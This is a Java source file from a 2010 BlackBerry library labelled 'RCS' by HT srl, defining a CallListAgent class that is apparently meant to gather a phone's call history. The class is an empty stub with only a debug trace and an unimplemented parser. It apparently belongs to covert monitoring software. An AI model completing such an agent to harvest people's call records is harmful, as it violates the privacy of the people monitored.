/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallListAgent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class CallListAgent.
 */
public final class CallListAgent extends Agent {
    //#debug
    private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);

    /**
     * Instantiates a new call list agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public CallListAgent(final boolean agentStatus) {
        super(Agent.AGENT_CALLLIST, agentStatus, true, "CallListAgent");

    }

    /**
     * Instantiates a new call list agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected CallListAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        // #debug debug
        debug.trace("run");

    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
